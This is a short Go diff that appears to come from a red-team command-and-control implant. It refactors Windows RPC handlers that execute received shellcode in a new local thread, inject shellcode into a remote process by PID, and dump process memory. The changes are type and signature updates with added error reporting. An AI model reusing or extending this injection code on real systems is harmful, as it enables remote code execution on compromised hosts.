@@ -14,7 +14,7 @@ import (
 )
 
 var (
-	windowsHandlers = map[int32]RPCHandler{
+	windowsHandlers = map[uint32]RPCHandler{
 		pb.MsgTask:           taskHandler,
 		pb.MsgRemoteTask:     remoteTaskHandler,
 		pb.MsgProcessDumpReq: dumpHandler,
@@ -32,13 +32,13 @@ var (
 	}
 )
 
-func getSystemHandlers() map[int32]RPCHandler {
+func getSystemHandlers() map[uint32]RPCHandler {
 	return windowsHandlers
 }
 
 // ---------------- Windows Handlers ----------------
 
-func taskHandler(send chan *pb.Envelope, data []byte) {
+func taskHandler(data []byte, resp RPCResponse) {
 	task := &pb.Task{}
 	err := proto.Unmarshal(data, task)
 	if err != nil {
@@ -58,9 +58,10 @@ func taskHandler(send chan *pb.Envelope, data []byte) {
 	log.Printf("creating local thread with start address: 0x%08x", addr)
 	// {{end}}
 	createThread.Call(0, 0, addr, 0, 0, 0)
+	resp([]byte{}, nil)
 }
 
-func remoteTaskHandler(send chan *pb.Envelope, data []byte) {
+func remoteTaskHandler(data []byte, resp RPCResponse) {
 	remoteTask := &pb.RemoteTask{}
 	err := proto.Unmarshal(data, remoteTask)
 	if err != nil {
@@ -69,7 +70,8 @@ func remoteTaskHandler(send chan *pb.Envelope, data []byte) {
 		// {{end}}
 		return
 	}
-	remoteThreadTaskInjection(int(remoteTask.Pid), remoteTask.Data)
+	err = remoteThreadTaskInjection(int(remoteTask.Pid), remoteTask.Data)
+	resp([]byte{}, err)
 }
 
 // ---------------- Platform Code ----------------
